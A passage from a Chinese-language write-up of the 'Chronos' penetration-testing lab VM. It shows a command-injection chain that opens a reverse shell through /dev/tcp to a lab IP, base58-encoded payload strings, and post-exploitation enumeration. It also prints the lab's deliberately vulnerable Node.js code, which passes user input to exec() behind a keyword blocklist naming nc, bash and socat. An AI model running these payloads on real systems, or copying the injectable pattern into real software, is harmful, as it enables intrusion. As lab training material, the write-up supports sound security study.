class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line">Mon Jul 10 05:29:12 UTC 2023</span><br><span class="line">total 15M</span><br><span class="line">-rwxr-xr-x 1 root root 1.1M Jun  6  2019 bash</span><br><span class="line">-rwxr-xr-x 1 root root 700K Mar 12  2018 btrfs</span><br><span class="line">lrwxrwxrwx 1 root root    5 Mar 12  2018 btrfsck -&gt; btrfs</span><br><span class="line">-rwxr-xr-x 1 root root 368K Mar 12  2018 btrfs-debug-tree</span><br><span class="line">-rwxr-xr-x 1 root root 364K Mar 12  2018 btrfs-find-root</span><br><span class="line">-rwxr-xr-x 1 root root 388K Mar 12  2018 btrfs-image</span><br><span class="line">-rwxr-xr-x 1 root root 368K Mar 12  2018 btrfs-map-logical</span><br><span class="line">-rwxr-xr-x 1 root root 364K Mar 12  2018 btrfs-select-super</span><br><span class="line">-rwxr-xr-x 1 root root 368K Mar 12  2018 btrfstune</span><br><span class="line">-rwxr-xr-x 1 root root 364K Mar 12  2018 btrfs-zero-log</span><br><span class="line">-rwxr-xr-x 3 root root  35K Jul  4  2019 bunzip2</span><br><span class="line">-rwxr-xr-x 1 root root 2.0M Sep 18  2020 busybox</span><br><span class="line">-rwxr-xr-x 3 root root  35K Jul  4  2019 bzcat</span><br><span class="line">lrwxrwxrwx 1 root root    6 Jul  4  2019 bzcmp -&gt; bzdiff</span><br><span class="line">-rwxr-xr-x 1 root root 2.1K Jul  4  2019 bzdiff</span><br><span class="line">lrwxrwxrwx 1 root root    6 Jul  4  2019 bzegrep -&gt; bzgrep</span><br><span class="line">-rwxr-xr-x 1 root root 4.8K Jul  4  2019 bzexe</span><br><span class="line">lrwxrwxrwx 1 root root    6 Jul  4  2019 bzfgrep -&gt; bzgrep</span><br><span class="line">-rwxr-xr-x 1 root root 3.6K Jul  4  2019 bzgrep</span><br><span class="line">-rwxr-xr-x 3 root root  35K Jul  4  2019 bzip2</span><br><span class="line">-rwxr-xr-x 1 root root  14K Jul  4  2019 bzip2recover</span><br><span class="line">lrwxrwxrwx 1 root root    6 Jul  4  2019 bzless -&gt; bzmore</span><br><span class="line">-rwxr-xr-x 1 root root 1.3K Jul  4  2019 bzmore</span><br><span class="line">-rwxr-xr-x 1 root root  35K Jan 18  2018 cat</span><br><span class="line">-rwxr-xr-x 1 root root  14K Apr 21  2017 chacl</span><br><span class="line">-rwxr-xr-x 1 root root  63K Jan 18  2018 chgrp</span><br><span class="line">-rwxr-xr-x 1 root root  59K Jan 18  2018 chmod</span><br><span class="line">-rwxr-xr-x 1 root root  67K Jan 18  2018 chown</span><br><span class="line">-rwxr-xr-x 1 root root  11K Jan 22  2018 chvt</span><br><span class="line">-rwxr-xr-x 1 root root 139K Jan 18  2018 cp</span><br><span class="line">-rwxr-xr-x 1 root root 154K Nov  5  2019 cpio</span><br><span class="line">-rwxr-xr-x 1 root root 119K Jan 25  2018 dash</span><br><span class="line">-rwxr-xr-x 1 root root  99K Jan 18  2018 date</span><br><span class="line">-rwxr-xr-x 1 root root  75K Jan 18  2018 dd</span><br><span class="line">-rwxr-xr-x 1 root root  83K Jan 18  2018 df</span><br><span class="line">-rwxr-xr-x 1 root root 131K Jan 18  2018 dir</span><br><span class="line">-rwxr-xr-x 1 root root  71K Sep 16  2020 dmesg</span><br><span class="line">lrwxrwxrwx 1 root root    8 Jan 31  2018 dnsdomainname -&gt; hostname</span><br><span class="line">lrwxrwxrwx 1 root root    8 Jan 31  2018 domainname -&gt; hostname</span><br><span class="line">-rwxr-xr-x 1 root root 167K Jan 22  2018 dumpkeys</span><br><span class="line">-rwxr-xr-x 1 root root  35K Jan 18  2018 echo</span><br><span class="line">-rwxr-xr-x 1 root root  51K Apr 26  2016 ed</span><br><span class="line">-rwxr-xr-x 1 root root   28 Sep 18  2019 egrep</span><br><span class="line">-rwxr-xr-x 1 root root  31K Jan 18  2018 false</span><br><span class="line">-rwxr-xr-x 1 root root  11K Jan 22  2018 fgconsole</span><br><span class="line">-rwxr-xr-x 1 root root   28 Sep 18  2019 fgrep</span><br><span class="line">-rwxr-xr-x 1 root root  64K Sep 16  2020 findmnt</span><br><span class="line">-rwxr-xr-x 1 root root 1.2K Mar 12  2018 fsck.btrfs</span><br><span class="line">-rwxr-xr-x 1 root root  36K Dec 11  2018 fuser</span><br><span class="line">-rwsr-xr-x 1 root root  31K Aug 11  2016 fusermount</span><br><span class="line">-rwxr-xr-x 1 root root  23K Apr 21  2017 getfacl</span><br><span class="line">-rwxr-xr-x 1 root root 215K Sep 18  2019 grep</span><br><span class="line">-rwxr-xr-x 2 root root 2.3K Jun 24  2021 gunzip</span><br><span class="line">-rwxr-xr-x 1 root root 5.8K Jun 24  2021 gzexe</span><br><span class="line">-rwxr-xr-x 1 root root 100K Jun 24  2021 gzip</span><br><span class="line">-rwxr-xr-x 1 root root  19K Jan 31  2018 hostname</span><br><span class="line">-rwxr-xr-x 1 root root 546K Jan 26  2021 ip</span><br><span class="line">-rwxr-xr-x 1 root root  63K Jul 21  2021 journalctl</span><br><span class="line">-rwxr-xr-x 1 root root  11K Jan 22  2018 kbd_mode</span><br><span class="line">-rwxr-xr-x 1 root root  27K Aug  9  2019 kill</span><br><span class="line">-rwxr-xr-x 1 root root 147K Jul 28  2020 kmod</span><br><span class="line">-rwxr-xr-x 1 root root 167K Dec  1  2017 less</span><br><span class="line">-rwxr-xr-x 1 root root  11K Dec  1  2017 lessecho</span><br><span class="line">lrwxrwxrwx 1 root root    8 Dec  1  2017 lessfile -&gt; lesspipe</span><br><span class="line">-rwxr-xr-x 1 root root  20K Dec  1  2017 lesskey</span><br><span class="line">-rwxr-xr-x 1 root root 8.4K Dec  1  2017 lesspipe</span><br><span class="line">-rwxr-xr-x 1 root root  67K Jan 18  2018 ln</span><br><span class="line">-rwxr-xr-x 1 root root 207K Jan 22  2018 loadkeys</span><br><span class="line">-rwxr-xr-x 1 root root  52K Mar 22  2019 login</span><br><span class="line">-rwxr-xr-x 1 root root  51K Jul 21  2021 loginctl</span><br><span class="line">-rwxr-xr-x 1 root root 107K Mar 21  2019 lowntfs-3g</span><br><span class="line">-rwxr-xr-x 1 root root 131K Jan 18  2018 ls</span><br><span class="line">-rwxr-xr-x 1 root root  83K Sep 16  2020 lsblk</span><br><span class="line">lrwxrwxrwx 1 root root    4 Jul 28  2020 lsmod -&gt; kmod</span><br><span class="line">-rwxr-xr-x 1 root root  79K Jan 18  2018 mkdir</span><br><span class="line">-rwxr-xr-x 1 root root 388K Mar 12  2018 mkfs.btrfs</span><br><span class="line">-rwxr-xr-x 1 root root  67K Jan 18  2018 mknod</span><br><span class="line">-rwxr-xr-x 1 root root  43K Jan 18  2018 mktemp</span><br><span class="line">-rwxr-xr-x 1 root root  39K Sep 16  2020 more</span><br><span class="line">-rwsr-xr-x 1 root root  43K Sep 16  2020 mount</span><br><span class="line">-rwxr-xr-x 1 root root  15K Sep 16  2020 mountpoint</span><br><span class="line">lrwxrwxrwx 1 root root   20 Jul 25  2018 mt -&gt; /etc/alternatives/mt</span><br><span class="line">-rwxr-xr-x 1 root root  79K Nov  5  2019 mt-gnu</span><br><span class="line">-rwxr-xr-x 1 root root 135K Jan 18  2018 mv</span><br><span class="line">-rwxr-xr-x 1 root root 241K Mar  6  2018 nano</span><br><span class="line">lrwxrwxrwx 1 root root   20 Jul 25  2018 nc -&gt; /etc/alternatives/nc</span><br><span class="line">-rwxr-xr-x 1 root root  35K May 14  2018 nc.openbsd</span><br><span class="line">lrwxrwxrwx 1 root root   24 Jul 25  2018 netcat -&gt; /etc/alternatives/netcat</span><br><span class="line">-rwxr-xr-x 1 root root 151K Jan 10  2017 netstat</span><br><span class="line">-rwxr-xr-x 1 root root  43K Jul 21  2021 networkctl</span><br><span class="line">lrwxrwxrwx 1 root root    8 Jan 31  2018 nisdomainname -&gt; hostname</span><br><span class="line">-rwxr-xr-x 1 root root 143K Mar 21  2019 ntfs-3g</span><br><span class="line">-rwxr-xr-x 1 root root  11K Mar 21  2019 ntfs-3g.probe</span><br><span class="line">-rwxr-xr-x 1 root root  27K Mar 21  2019 ntfscat</span><br><span class="line">-rwxr-xr-x 1 root root  35K Mar 21  2019 ntfscluster</span><br><span class="line">-rwxr-xr-x 1 root root  35K Mar 21  2019 ntfscmp</span><br><span class="line">-rwxr-xr-x 1 root root  35K Mar 21  2019 ntfsfallocate</span><br><span class="line">-rwxr-xr-x 1 root root  43K Mar 21  2019 ntfsfix</span><br><span class="line">-rwxr-xr-x 1 root root  55K Mar 21  2019 ntfsinfo</span><br><span class="line">-rwxr-xr-x 1 root root  32K Mar 21  2019 ntfsls</span><br><span class="line">-rwxr-xr-x 1 root root  31K Mar 21  2019 ntfsmove</span><br><span class="line">-rwxr-xr-x 1 root root 115K Mar 21  2019 ntfsrecover</span><br><span class="line">-rwxr-xr-x 1 root root  87K Mar 21  2019 ntfssecaudit</span><br><span class="line">-rwxr-xr-x 1 root root  39K Mar 21  2019 ntfstruncate</span><br><span class="line">-rwxr-xr-x 1 root root  31K Mar 21  2019 ntfsusermap</span><br><span class="line">-rwxr-xr-x 1 root root  47K Mar 21  2019 ntfswipe</span><br><span class="line">lrwxrwxrwx 1 root root    6 Jan 22  2018 open -&gt; openvt</span><br><span class="line">-rwxr-xr-x 1 root root  19K Jan 22  2018 openvt</span><br><span class="line">lrwxrwxrwx 1 root root   14 Nov  1  2017 pidof -&gt; /sbin/killall5</span><br><span class="line">-rwsr-xr-x 1 root root  63K Jun 28  2019 ping</span><br><span class="line">lrwxrwxrwx 1 root root    4 Jun 28  2019 ping4 -&gt; ping</span><br><span class="line">lrwxrwxrwx 1 root root    4 Jun 28  2019 ping6 -&gt; ping</span><br><span class="line">-rwxr-xr-x 1 root root  38K Apr  4  2019 plymouth</span><br><span class="line">-rwxr-xr-x 1 root root 131K Aug  9  2019 ps</span><br><span class="line">-rwxr-xr-x 1 root root  35K Jan 18  2018 pwd</span><br><span class="line">lrwxrwxrwx 1 root root    4 Jun  6  2019 rbash -&gt; bash</span><br><span class="line">-rwxr-xr-x 1 root root  43K Jan 18  2018 readlink</span><br><span class="line">-rwxr-xr-x 1 root root   89 Apr 26  2016 red</span><br><span class="line">-rwxr-xr-x 1 root root  63K Jan 18  2018 rm</span><br><span class="line">-rwxr-xr-x 1 root root  43K Jan 18  2018 rmdir</span><br><span class="line">lrwxrwxrwx 1 root root    4 Mar  6  2018 rnano -&gt; nano</span><br><span class="line">-rwxr-xr-x 1 root root  19K Dec 30  2017 run-parts</span><br><span class="line">-rwxr-xr-x 1 root root 107K Jan 30  2018 sed</span><br><span class="line">-rwxr-xr-x 1 root root  35K Apr 21  2017 setfacl</span><br><span class="line">-rwxr-xr-x 1 root root  43K Jan 22  2018 setfont</span><br><span class="line">-rwxr-xr-x 1 root root  39K Apr 23  2019 setupcon</span><br><span class="line">lrwxrwxrwx 1 root root    4 Jul 25  2018 sh -&gt; dash</span><br><span class="line">lrwxrwxrwx 1 root root    4 Jan 25  2018 sh.distrib -&gt; dash</span><br><span class="line">-rwxr-xr-x 1 root root  35K Jan 18  2018 sleep</span><br><span class="line">-rwxr-xr-x 1 root root 137K Jan 26  2021 ss</span><br><span class="line">lrwxrwxrwx 1 root root    7 Sep 18  2020 static-sh -&gt; busybox</span><br><span class="line">-rwxr-xr-x 1 root root  75K Jan 18  2018 stty</span><br><span class="line">-rwsr-xr-x 1 root root  44K Mar 22  2019 su</span><br><span class="line">-rwxr-xr-x 1 root root  35K Jan 18  2018 sync</span><br><span class="line">-rwxr-xr-x 1 root root 179K Jul 21  2021 systemctl</span><br><span class="line">lrwxrwxrwx 1 root root   20 Jul 21  2021 systemd -&gt; /lib/systemd/systemd</span><br><span class="line">-rwxr-xr-x 1 root root  11K Jul 21  2021 systemd-ask-password</span><br><span class="line">-rwxr-xr-x 1 root root  15K Jul 21  2021 systemd-escape</span><br><span class="line">-rwxr-xr-x 1 root root  83K Jul 21  2021 systemd-hwdb</span><br><span class="line">-rwxr-xr-x 1 root root  15K Jul 21  2021 systemd-inhibit</span><br><span class="line">-rwxr-xr-x 1 root root  19K Jul 21  2021 systemd-machine-id-setup</span><br><span class="line">-rwxr-xr-x 1 root root  15K Jul 21  2021 systemd-notify</span><br><span class="line">-rwxr-xr-x 1 root root  43K Jul 21  2021 systemd-sysusers</span><br><span class="line">-rwxr-xr-x 1 root root  71K Jul 21  2021 systemd-tmpfiles</span><br><span class="line">-rwxr-xr-x 1 root root  27K Jul 21  2021 systemd-tty-ask-password-agent</span><br><span class="line">-rwxr-xr-x 1 root root 414K Dec 16  2020 tar</span><br><span class="line">-rwxr-xr-x 1 root root 9.9K Dec 30  2017 tempfile</span><br><span class="line">-rwxr-xr-x 1 root root  87K Jan 18  2018 touch</span><br><span class="line">-rwxr-xr-x 1 root root  31K Jan 18  2018 true</span><br><span class="line">-rwxr-xr-x 1 root root 571K Jul 21  2021 udevadm</span><br><span class="line">-rwxr-xr-x 1 root root  14K Aug 11  2016 ulockmgr_server</span><br><span class="line">-rwsr-xr-x 1 root root  27K Sep 16  2020 umount</span><br><span class="line">-rwxr-xr-x 1 root root  35K Jan 18  2018 uname</span><br><span class="line">-rwxr-xr-x 2 root root 2.3K Jun 24  2021 uncompress</span><br><span class="line">-rwxr-xr-x 1 root root 2.7K Jan 22  2018 unicode_start</span><br><span class="line">-rwxr-xr-x 1 root root 131K Jan 18  2018 vdir</span><br><span class="line">-rwxr-xr-x 1 root root  31K Sep 16  2020 wdctl</span><br><span class="line">-rwxr-xr-x 1 root root  946 Dec 30  2017 which</span><br><span class="line">-rwxr-xr-x 1 root root  27K Jan 12  2018 whiptail</span><br><span class="line">lrwxrwxrwx 1 root root    8 Jan 31  2018 ypdomainname -&gt; hostname</span><br><span class="line">-rwxr-xr-x 1 root root 1.9K Jun 24  2021 zcat</span><br><span class="line">-rwxr-xr-x 1 root root 1.8K Jun 24  2021 zcmp</span><br><span class="line">-rwxr-xr-x 1 root root 5.7K Jun 24  2021 zdiff</span><br><span class="line">-rwxr-xr-x 1 root root  140 Jun 24  2021 zegrep</span><br><span class="line">-rwxr-xr-x 1 root root  140 Jun 24  2021 zfgrep</span><br><span class="line">-rwxr-xr-x 1 root root 2.1K Jun 24  2021 zforce</span><br><span class="line">-rwxr-xr-x 1 root root 5.8K Jun 24  2021 zgrep</span><br><span class="line">-rwxr-xr-x 1 root root 2.0K Jun 24  2021 zless</span><br><span class="line">-rwxr-xr-x 1 root root 1.9K Jun 24  2021 zmore</span><br><span class="line">-rwxr-xr-x 1 root root 5.0K Jun 24  2021 znew</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; touch a.sh</span><br><span class="line">&amp;&amp; echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.102/7779 0&gt;&amp;1&#x27; &gt; ./a.sh</span><br><span class="line">&amp;&amp; bash ./a.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">F2SaUcu11quzvQKEJBT</span><br><span class="line"></span><br><span class="line">B2K4FCAU1SDpFs1S5Lz6BZeyhpypkmQyyYfeZ3717VL7rKXQ59JFUhUZnxUsfycU3axZP25hRoQq5mibLkoRhy</span><br><span class="line"></span><br><span class="line">F2SaQ9Dykw37PPsvZhq</span><br></pre></td></tr></table></figure>

<p>拿到反弹的shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uname -a</span><br><span class="line">cd /home &amp;&amp; ls</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/chronos</span><br><span class="line">ls -alh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@chronos:/opt/chronos$ ls -alh</span><br><span class="line">ls -alh</span><br><span class="line">total 60K</span><br><span class="line">drwxr-xr-x  3 www-data www-data 4.0K Jul 10 05:33 .</span><br><span class="line">drwxr-xr-x  4 root     root     4.0K Jul 30  2021 ..</span><br><span class="line">-rw-r--r--  1 www-data www-data 1.4K Aug  3  2021 app.js</span><br><span class="line">-rw-r--r--  1 www-data www-data   45 Jul 10 05:39 a.sh</span><br><span class="line">drwxr-xr-x 56 www-data www-data 4.0K Jul 30  2021 node_modules</span><br><span class="line">-rw-r--r--  1 www-data www-data   97 Jul 30  2021 package.json</span><br><span class="line">-rw-r--r--  1 www-data www-data  33K Jul 30  2021 package-lock.json</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@chronos:/opt/chronos$ cat package.json</span><br><span class="line">cat package.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;bs58&quot;: &quot;^4.0.1&quot;,</span><br><span class="line">    &quot;cors&quot;: &quot;^2.8.5&quot;,</span><br><span class="line">    &quot;express&quot;: &quot;^4.17.1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>bs58 眼熟吗？想到前面的 base58 加密了吗？对于它想提升权限帮助不大</li>
<li>cors 模块解析 作用 主要用来解决客户端请求与服务端的跨域问题，对于它想提升权限帮助不大</li>
<li>express 相较于原生的http模块做了较好的扩展工作，让开发者可以高效地进行服务器业务开发，对于有用漏洞就应该存在于此</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>());</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span>&#123;</span><br><span class="line">  </span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;/var/www/html/index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> agent = req.<span class="property">headers</span>[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;                        <span class="comment">// 开始构建命令语句</span></span><br><span class="line">    <span class="keyword">const</span> format = req.<span class="property">query</span>.<span class="property">format</span>;</span><br><span class="line">    <span class="keyword">const</span> bytes = bs58.<span class="title function_">decode</span>(format);</span><br><span class="line">    <span class="keyword">var</span> decoded = bytes.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">var</span> concat = cmd.<span class="title function_">concat</span>(decoded);</span><br><span class="line">    <span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (concat.<span class="title function_">includes</span>(<span class="string">&#x27;id&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;whoami&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;python&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;nc&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;bash&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;php&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;which&#x27;</span>) || concat.<span class="title function_">includes</span>(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line"> </span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;Something went wrong&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 执行命令，利用关键</span></span><br><span class="line">        <span class="title function_">exec</span>(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`error: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="title function_">send</span>(stdout);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line"> </span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;Permission Denied&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">listen</span>(port,<span class="function">() =&gt;</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line"> </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd .. </span><br><span class="line">ls -alh </span><br><span class="line">cd chronos-v2 </span><br><span class="line">cd backend </span><br><span class="line">cat server.js</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&quot;express-fileupload&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileupload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&quot;/opt/chronos-v2/frontend/pages&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title class_">Server</span>(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.<span class="title function_">listen</span>(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>package.json</code> 指明了服务端运作文件是 <code>server.js</code> 涉及三个模块<ul>
<li>ejs 模块是嵌入式 JavaScript 模板引擎</li>
<li>express 与之前相同</li>
